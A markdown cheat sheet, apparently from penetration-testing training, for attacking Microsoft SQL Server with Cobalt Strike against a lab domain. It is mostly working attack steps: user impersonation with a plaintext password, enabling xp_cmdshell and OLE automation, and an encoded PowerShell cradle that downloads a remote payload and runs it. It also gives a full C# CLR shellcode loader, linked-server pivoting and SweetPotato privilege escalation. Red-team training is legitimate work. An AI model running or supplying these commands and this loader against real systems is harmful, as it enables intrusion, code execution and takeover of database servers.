# MSSQL Attacks (Cobalt Strike)

---

## Setup

Load the SQL-BOF Aggressor script:
1. Go to **Cobalt Strike > Script Manager**
2. Click **Load**
3. Select `C:\Tools\SQL-BOF\SQL\SQL.cna`

---

## Enumeration

### Find MSSQL Servers via LDAP

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

# Example output:
name: MSSQL Service
sAMAccountName: mssql_svc
servicePrincipalName: MSSQLSvc/ilf-db-1.inlanefreight.local:1433, MSSQLSvc/ilf-db-1.inlanefreight.local
retrieved 1 results total
```

### Server Information

```
sql-info ilf-db-1
sql-whoami ilf-db-1
```

### Impersonate User with Access

```
make_token INLANEFREIGHT\tmorgan Passw0rd!
```

---

## xp_cmdshell

Direct command execution with output.

### Check if Enabled

```
sql-query ilf-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```

### Enable

```
sql-enablexp ilf-db-1
```

### Execute Commands

```
sql-xpcmd ilf-db-1 "hostname && whoami"
```

### Disable (Cleanup)

```
sql-disablexp ilf-db-1
```

---

## OLE Automation Procedures

Command execution **without output** - use for reverse shells.

### Check if Enabled

```
sql-query ilf-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
```

### Enable

```
sql-enableole ilf-db-1
```

### Execute Reverse Shell

Generate encoded PowerShell command:
```powershell
$cmd = 'iex (new-object net.webclient).downloadstring("http://ilf-wkstn-1:8080/b")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

Execute:
```
sql-olecmd ilf-db-1 "cmd /c powershell -w hidden -nop -enc [ENCODED-COMMAND]"
link ilf-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

### Disable (Cleanup)

```
sql-disableole ilf-db-1
```

---

## SQL CLR (Common Language Runtime)

Execute .NET assemblies within SQL Server.

### Check if Enabled

```
sql-query ilf-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```

### Create CLR Assembly

1. Create new **Class Library (.NET Framework)** in Visual Studio
   - Project name: `MyProcedure`

2. Add `smb_x64.xthread.bin` as embedded resource

3. Use the following code:

```csharp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var assembly = Assembly.GetExecutingAssembly();
        byte[] shellcode;

        // Read embedded payload
        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
        {
            using (var ms = new MemoryStream())
            {
                rs.CopyTo(ms);
                shellcode = ms.ToArray();
            }
        }

        // Allocate memory
        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

        // Copy shellcode
        WriteProcessMemory(
            new IntPtr(-1),
            hMemory,
            shellcode,
            (uint)shellcode.Length,
            out _);

        // Create thread
        var hThread = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
            out _);

        CloseHandle(hThread);
    }

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType, PAGE_PROTECTION_FLAGS flProtect);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, THREAD_CREATION_FLAGS dwCreationFlags,
        out uint lpThreadId);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum VIRTUAL_ALLOCATION_TYPE : uint
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
    }

    [Flags]
    public enum PAGE_PROTECTION_FLAGS : uint
    {
        PAGE_EXECUTE_READWRITE = 0x00000040,
    }

    [Flags]
    public enum THREAD_CREATION_FLAGS : uint
    {
        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
    }
}
```

### Execute CLR DLL

```
sql-clr ilf-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
link ilf-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

### Disable (Cleanup)

```
sql-disableclr ilf-db-1
```

---

## Linked Servers

Pivot through SQL Server links.

### Enumerate Links

```
sql-links ilf-db-1
```

### Check Identity on Linked Server

```
sql-whoami ilf-db-1 "" ilf-db-2
```

### Enable RPC for Linked Server

```
sql-checkrpc ilf-db-1
sql-enablerpc ilf-db-1 ilf-db-2
```

### Execute CLR via Linked Server

```
sql-clr ilf-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" ilf-db-2
link ilf-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

---

## SQL Server Privilege Escalation

Escalate from SQL service account to SYSTEM using potato attacks.

### Check Token Privileges

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
```

### Find Writable Directory

```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
```

### Upload Payload

```
upload C:\Payloads\tcp-local_x64.exe
```

### Execute SweetPotato

```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
connect localhost 1337
```

---

## Quick Reference

| Method | Output | Use Case |
|--------|--------|----------|
| xp_cmdshell | ✅ Yes | Quick command execution |
| OLE Automation | ❌ No | Reverse shell payload |
| CLR | ❌ No | Beacon injection |
| Linked Servers | Varies | Pivot to other SQL servers |

| SQL-BOF Command | Description |
|-----------------|-------------|
| `sql-info` | Server information |
| `sql-whoami` | Current user context |
| `sql-query` | Execute raw SQL |
| `sql-enablexp` / `sql-disablexp` | Toggle xp_cmdshell |
| `sql-xpcmd` | Execute via xp_cmdshell |
| `sql-enableole` / `sql-disableole` | Toggle OLE Automation |
| `sql-olecmd` | Execute via OLE |
| `sql-clr` | Execute CLR assembly |
| `sql-disableclr` | Disable CLR |
| `sql-links` | Enumerate linked servers |
| `sql-checkrpc` / `sql-enablerpc` | Toggle RPC |
